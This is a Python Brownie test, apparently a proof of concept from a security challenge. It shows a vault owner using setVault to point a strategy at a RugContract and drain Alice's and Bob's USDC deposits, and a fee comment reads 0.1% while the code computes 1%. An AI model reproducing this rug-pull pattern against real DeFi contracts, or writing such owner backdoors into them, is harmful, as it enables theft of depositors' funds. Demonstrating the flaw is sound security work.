from scripts.OPTMIZER_vaults2 import *
from brownie import RugContract

def test_optmizer_vault2_exploit():

    # Approve the vault for the attacker & bob
    usdc.approve(vault.address, ALICE_USDC_BALANCE, {'from': alice})
    usdc.approve(vault.address, BOB_USDC_BALANCE, {'from': bob})

    # Alice and Bob initiates a tx to be the first depositor in the vault system
    vault.deposit(ALICE_USDC_BALANCE, {'from': alice, 'required_confs':0})
    vault.deposit(BOB_USDC_BALANCE, {'from': bob, 'required_confs':0})

    # TODO: Owner deploys a rugging contract
    rugContract = RugContract.deploy(strategy, {'from': owner, 'gas_price': '19 gwei'})

    # TODO: Owner rugs the vault system!
    strategy.setVault(rugContract, {'from': owner})
    rugContract.rug()

    # SUCCESS CONDITIONS */
    ruggedAmount = BOB_USDC_BALANCE + ALICE_USDC_BALANCE
    withdrawalFees = ruggedAmount * 10 / 1000 # 0.1% withdrawal fees

    # The strategy is now empty except for withdrawal fees
    assert strategy.balanceOf() == withdrawalFees

    # The owner now holds the rugged USDC minus withdrawalFees
    assert usdc.balanceOf(owner) == ruggedAmount - withdrawalFees
